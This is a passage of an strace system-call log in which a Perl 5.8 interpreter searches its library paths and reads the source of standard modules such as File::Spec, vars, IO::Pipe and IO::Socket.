5839  07:10:58.149589 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149603 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149615 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149628 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149640 stat64("/usr/share/perl5/File/Spec.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149653 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149666 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149679 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149692 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
5839  07:10:58.149714 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.149728 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.149739 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.149758 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
5839  07:10:58.149834 stat64("/etc/perl/vars.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149848 stat64("/etc/perl/vars.pm", 0xbfe6096c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149861 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149877 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfe6096c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149891 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149994 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfe6096c) = -1 ENOENT (No such file or directory)
5839  07:10:58.150037 stat64("/usr/lib/perl5/vars.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.150049 stat64("/usr/lib/perl5/vars.pm", 0xbfe6096c) = -1 ENOENT (No such file or directory)
5839  07:10:58.150078 stat64("/usr/share/perl5/vars.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.150090 stat64("/usr/share/perl5/vars.pm", 0xbfe6096c) = -1 ENOENT (No such file or directory)
5839  07:10:58.150103 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.150114 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfe6096c) = -1 ENOENT (No such file or directory)
5839  07:10:58.150128 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.150140 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
5839  07:10:58.150160 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
5839  07:10:58.150174 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60778) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.150185 _llseek(10, 0, [0], SEEK_CUR) = 0
5839  07:10:58.150201 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
5839  07:10:58.150312 stat64("/etc/perl/warnings/register.pmc", 0xbfe605ac) = -1 ENOENT (No such file or directory)
5839  07:10:58.150327 stat64("/etc/perl/warnings/register.pm", 0xbfe604bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.150341 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfe605ac) = -1 ENOENT (No such file or directory)
5839  07:10:58.150353 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfe604bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.150368 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfe605ac) = -1 ENOENT (No such file or directory)
5839  07:10:58.150381 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfe604bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.150395 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfe605ac) = -1 ENOENT (No such file or directory)
5839  07:10:58.150407 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfe604bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.150421 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfe605ac) = -1 ENOENT (No such file or directory)
5839  07:10:58.150433 stat64("/usr/share/perl5/warnings/register.pm", 0xbfe604bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.150450 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfe605ac) = -1 ENOENT (No such file or directory)
5839  07:10:58.150463 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfe604bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.150514 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfe605ac) = -1 ENOENT (No such file or directory)
5839  07:10:58.150529 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
5839  07:10:58.150585 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
5839  07:10:58.150600 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe602c8) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.150611 _llseek(11, 0, [0], SEEK_CUR) = 0
5839  07:10:58.150630 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
5839  07:10:58.150773 read(11, "", 4096) = 0
5839  07:10:58.150786 close(11)         = 0
5839  07:10:58.150993 _llseek(10, 1148, [1148], SEEK_SET) = 0
5839  07:10:58.151039 _llseek(10, 0, [1148], SEEK_CUR) = 0
5839  07:10:58.151066 close(10)         = 0
5839  07:10:58.151154 _llseek(8, 594, [594], SEEK_SET) = 0
5839  07:10:58.159781 _llseek(8, 0, [594], SEEK_CUR) = 0
5839  07:10:58.159781 close(8)          = 0
5839  07:10:58.159782 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.159782 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.159782 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.159783 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.159818 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.159867 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.160049 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.160068 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.160083 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.160128 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.160142 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.160156 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.160169 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.160183 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
5839  07:10:58.160204 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.160219 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.160230 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.160249 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
5839  07:10:58.160928 brk(0x8218000)    = 0x8218000
5839  07:10:58.161115 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
5839  07:10:58.161512 read(8, "", 4096) = 0
5839  07:10:58.161528 close(8)          = 0
5839  07:10:58.161733 read(6, "", 4096) = 0
5839  07:10:58.161747 close(6)          = 0
5839  07:10:58.161911 stat64("/etc/perl/IO/Pipe.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.161927 stat64("/etc/perl/IO/Pipe.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.161941 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.161954 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.161982 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.162027 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.162058 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.162070 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.162083 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.162095 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.162108 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.162120 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
5839  07:10:58.162142 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
5839  07:10:58.162156 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe610d8) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.162168 _llseek(6, 0, [0], SEEK_CUR) = 0
5839  07:10:58.162188 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
5839  07:10:58.162871 _llseek(6, 3425, [3425], SEEK_SET) = 0
5839  07:10:58.162889 _llseek(6, 0, [3425], SEEK_CUR) = 0
5839  07:10:58.162900 close(6)          = 0
5839  07:10:58.162923 stat64("/etc/perl/IO/Socket.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.162937 stat64("/etc/perl/IO/Socket.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.162951 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.162976 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.163019 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.163046 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.163061 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.163073 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.163086 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.163098 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.163125 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.163138 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
5839  07:10:58.163159 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
5839  07:10:58.163173 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe610d8) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.163185 _llseek(6, 0, [0], SEEK_CUR) = 0
5839  07:10:58.163202 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = 